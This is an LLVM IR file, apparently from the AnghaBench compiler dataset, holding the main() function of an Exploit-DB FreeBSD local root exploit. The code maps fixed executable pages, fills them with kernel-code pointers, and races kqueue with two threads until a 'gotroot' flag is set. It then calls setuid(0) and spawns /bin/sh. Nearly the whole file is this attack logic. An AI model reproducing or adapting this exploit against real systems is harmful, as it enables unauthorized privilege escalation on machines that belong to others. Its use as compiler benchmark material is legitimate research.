; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/freebsd/local/extr_9860.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/freebsd/local/extr_9860.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i64 }
%struct.cdev = type { i32 }

@__const.main.pages = private unnamed_addr constant [3 x i64] [i64 0, i64 173412352, i64 58601472], align 16
@__const.main.sizes = private unnamed_addr constant [3 x i64] [i64 61440, i64 4096, i64 4096], align 16
@.str = private unnamed_addr constant [24 x i8] c"[*] allocating %p @ %p\0A\00", align 1
@PROT_READ = common dso_local global i32 0, align 4
@PROT_WRITE = common dso_local global i32 0, align 4
@PROT_EXEC = common dso_local global i32 0, align 4
@MAP_ANON = common dso_local global i32 0, align 4
@MAP_FIXED = common dso_local global i32 0, align 4
@MAP_FAILED = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [5 x i8] c"mmap\00", align 1
@JE_ADDRESS = common dso_local global i32 0, align 4
@kernel_code = common dso_local global i32 0, align 4
@kq = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [7 x i8] c"kqueue\00", align 1
@do_thread = common dso_local global i64 0, align 8
@do_thread2 = common dso_local global i64 0, align 8
@timeout = common dso_local global %struct.TYPE_2__ zeroinitializer, align 8
@.str.3 = private unnamed_addr constant [21 x i8] c"waiting for root...\0A\00", align 1
@gotroot = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [35 x i8] c"failed - system patched or not MP\0A\00", align 1
@.str.5 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.6 = private unnamed_addr constant [3 x i8] c"sh\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.cdev, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i64*, align 8
  %8 = alloca [3 x i64], align 16
  %9 = alloca [3 x i64], align 16
  store i32 0, i32* %1, align 4
  %10 = bitcast [3 x i64]* %8 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %10, i8* align 16 bitcast ([3 x i64]* @__const.main.pages to i8*), i64 24, i1 false)
  %11 = bitcast [3 x i64]* %9 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %11, i8* align 16 bitcast ([3 x i64]* @__const.main.sizes to i8*), i64 24, i1 false)
  store i32 0, i32* %2, align 4
  br label %12

12:                                               ; preds = %49, %0
  %13 = load i32, i32* %2, align 4
  %14 = sext i32 %13 to i64
  %15 = icmp ult i64 %14, 3
  br i1 %15, label %16, label %52

16:                                               ; preds = %12
  %17 = load i32, i32* %2, align 4
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds [3 x i64], [3 x i64]* %9, i64 0, i64 %18
  %20 = load i64, i64* %19, align 8
  %21 = load i32, i32* %2, align 4
  %22 = sext i32 %21 to i64
  %23 = getelementptr inbounds [3 x i64], [3 x i64]* %8, i64 0, i64 %22
  %24 = load i64, i64* %23, align 8
  %25 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str, i64 0, i64 0), i64 %20, i64 %24)
  %26 = load i32, i32* %2, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds [3 x i64], [3 x i64]* %8, i64 0, i64 %27
  %29 = load i64, i64* %28, align 8
  %30 = inttoptr i64 %29 to i8*
  %31 = load i32, i32* %2, align 4
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [3 x i64], [3 x i64]* %9, i64 0, i64 %32
  %34 = load i64, i64* %33, align 8
  %35 = load i32, i32* @PROT_READ, align 4
  %36 = load i32, i32* @PROT_WRITE, align 4
  %37 = or i32 %35, %36
  %38 = load i32, i32* @PROT_EXEC, align 4
  %39 = or i32 %37, %38
  %40 = load i32, i32* @MAP_ANON, align 4
  %41 = load i32, i32* @MAP_FIXED, align 4
  %42 = or i32 %40, %41
  %43 = call i64 @mmap(i8* %30, i64 %34, i32 %39, i32 %42, i32 -1, i32 0)
  %44 = load i64, i64* @MAP_FAILED, align 8
  %45 = icmp eq i64 %43, %44
  br i1 %45, label %46, label %48

46:                                               ; preds = %16
  %47 = call i32 @perror(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %112

48:                                               ; preds = %16
  br label %49

49:                                               ; preds = %48
  %50 = load i32, i32* %2, align 4
  %51 = add nsw i32 %50, 1
  store i32 %51, i32* %2, align 4
  br label %12

52:                                               ; preds = %12
  %53 = load i32, i32* @JE_ADDRESS, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds %struct.cdev, %struct.cdev* %5, i32 0, i32 0
  %56 = bitcast i32* %55 to i8*
  %57 = bitcast %struct.cdev* %5 to i8*
  %58 = ptrtoint i8* %56 to i64
  %59 = ptrtoint i8* %57 to i64
  %60 = sub i64 %58, %59
  %61 = sub nsw i64 %54, %60
  store i64 %61, i64* inttoptr (i64 28 to i64*), align 8
  %62 = getelementptr inbounds [3 x i64], [3 x i64]* %8, i64 0, i64 2
  %63 = load i64, i64* %62, align 16
  %64 = inttoptr i64 %63 to i8*
  store i8* %64, i8** %6, align 8
  %65 = load i8*, i8** %6, align 8
  %66 = bitcast i8* %65 to i64*
  store i64* %66, i64** %7, align 8
  store i32 0, i32* %2, align 4
  br label %67

67:                                               ; preds = %77, %52
  %68 = load i32, i32* %2, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [3 x i64], [3 x i64]* %9, i64 0, i64 2
  %71 = load i64, i64* %70, align 16
  %72 = udiv i64 %71, 4
  %73 = icmp ult i64 %69, %72
  br i1 %73, label %74, label %80

74:                                               ; preds = %67
  %75 = load i64*, i64** %7, align 8
  %76 = getelementptr inbounds i64, i64* %75, i32 1
  store i64* %76, i64** %7, align 8
  store i64 ptrtoint (i32* @kernel_code to i64), i64* %75, align 8
  br label %77

77:                                               ; preds = %74
  %78 = load i32, i32* %2, align 4
  %79 = add nsw i32 %78, 1
  store i32 %79, i32* %2, align 4
  br label %67

80:                                               ; preds = %67
  %81 = call i32 (...) @kqueue()
  store i32 %81, i32* @kq, align 4
  %82 = icmp slt i32 %81, 0
  br i1 %82, label %83, label %85

83:                                               ; preds = %80
  %84 = call i32 @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %112

85:                                               ; preds = %80
  %86 = load i64, i64* @do_thread, align 8
  %87 = inttoptr i64 %86 to i8*
  %88 = call i32 @pthread_create(i32* %3, i32* null, i8* %87, i32* null)
  %89 = load i64, i64* @do_thread2, align 8
  %90 = inttoptr i64 %89 to i8*
  %91 = call i32 @pthread_create(i32* %4, i32* null, i8* %90, i32* null)
  store i64 0, i64* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @timeout, i32 0, i32 1), align 8
  store i32 1, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @timeout, i32 0, i32 0), align 8
  %92 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.3, i64 0, i64 0))
  store i32 0, i32* %2, align 4
  br label %93

93:                                               ; preds = %102, %85
  %94 = load i32, i32* @gotroot, align 4
  %95 = icmp ne i32 %94, 0
  br i1 %95, label %100, label %96

96:                                               ; preds = %93
  %97 = load i32, i32* %2, align 4
  %98 = add nsw i32 %97, 1
  store i32 %98, i32* %2, align 4
  %99 = icmp slt i32 %97, 10000
  br label %100

100:                                              ; preds = %96, %93
  %101 = phi i1 [ false, %93 ], [ %99, %96 ]
  br i1 %101, label %102, label %104

102:                                              ; preds = %100
  %103 = call i32 @usleep(i32 100)
  br label %93

104:                                              ; preds = %100
  %105 = call i32 @setuid(i32 0)
  %106 = call i64 (...) @getuid()
  %107 = icmp ne i64 %106, 0
  br i1 %107, label %108, label %110

108:                                              ; preds = %104
  %109 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.4, i64 0, i64 0))
  store i32 -1, i32* %1, align 4
  br label %112

110:                                              ; preds = %104
  %111 = call i32 @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.6, i64 0, i64 0), i32* null)
  store i32 0, i32* %1, align 4
  br label %112

112:                                              ; preds = %110, %108, %83, %46
  %113 = load i32, i32* %1, align 4
  ret i32 %113
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i64 @mmap(i8*, i64, i32, i32, i32, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @kqueue(...) #2

declare !callback !2 dso_local i32 @pthread_create(i32*, i32*, i8*, i32*) #2

declare dso_local i32 @usleep(i32) #2

declare dso_local i32 @setuid(i32) #2

declare dso_local i64 @getuid(...) #2

declare dso_local i32 @execl(i8*, i8*, i32*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
